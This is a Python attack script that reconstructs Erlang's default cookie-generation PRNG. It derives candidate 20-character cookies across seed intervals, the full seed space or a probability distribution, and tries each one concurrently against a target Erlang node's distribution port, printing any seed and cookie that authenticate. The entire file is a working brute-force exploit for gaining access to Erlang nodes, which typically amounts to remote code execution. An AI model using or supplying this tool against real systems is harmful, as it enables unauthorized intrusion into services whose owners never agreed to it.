#!/usr/bin/env python3

import asyncio
from erldp import authenticate

import sys
import argparse
import json
from itertools import islice


def parse_interval(arg):
  elms = arg.split(',')
  assert(len(elms) == 3)
  return int(elms[0], 0), int(elms[1], 0), float(elms[2])

def parse_distribution(arg):
  intervals = []
  with open(arg, 'r') as f:
    obj = json.load(f)
    for item in obj:
      assert('start' in item)
      assert('stop' in item)
      assert('prob' in item)
      intervals.append((item['start'], item['stop'], item['prob']))
  return intervals

def walk_intervals(intervals):
  for (start, stop, prob) in sorted(intervals, key=lambda x: x[2], reverse=True):
    for x in range(start, stop):
      yield x


def next_random(x): return (x*17059465 + 1) & 0xfffffffff
def derive_cookie(seed, size):
  x = seed
  cookie = bytearray(b'0'*size)
  for i in range(size-1, -1, -1):
    x = next_random(x)
    cookie[i] = ord('A') + ((26*x) // 0x1000000000)
  return bytes(cookie)

def batched(iterable, n):
  "Batch data into tuples of length n. The last batch may be shorter."
  # batched('ABCDEFG', 3) --> ABC DEF G
  if n < 1:
    raise ValueError('n must be at least one')
  it = iter(iterable)
  while batch := tuple(islice(it, n)):
    yield batch

async def derive_and_authenticate(seed, target, port):
  cookie = derive_cookie(seed, 20)

  success = await authenticate(target, port, cookie)
  if success:
    print(f'[*] seed={seed:#x} cookie={cookie.decode()}')
    (r, w) = success
    w.close()
    await w.wait_closed()

async def amain(intervals, sim, target, port):
  for seeds in batched(walk_intervals(intervals), sim):
    tasks = [asyncio.create_task(derive_and_authenticate(seed, target, port)) for seed in seeds]
    await asyncio.gather(*tasks)

if __name__ == '__main__':
  import argparse

  parser = argparse.ArgumentParser()
  mutual = parser.add_mutually_exclusive_group(required=True)
  mutual.add_argument('--interval', action='append', type=parse_interval)
  mutual.add_argument('--distribution')
  mutual.add_argument('--seed-full-space', action='store_true')
  mutual.add_argument('--sim', default=16, type=int)
  parser.add_argument('target', action='store', type=str, help='Erlang node address or FQDN')
  parser.add_argument('port', action='store', type=int, help='Erlang node TCP port')

  args = parser.parse_args()
  print(args)

  if args.seed_full_space:
    intervals = [parse_interval('0,68719476735,100.0')]
  elif args.distribution:
    intervals = parse_distribution(args.distribution)
  else:
    intervals = args.interval
    pass

  asyncio.run(amain(intervals, args.sim, args.target, args.port))
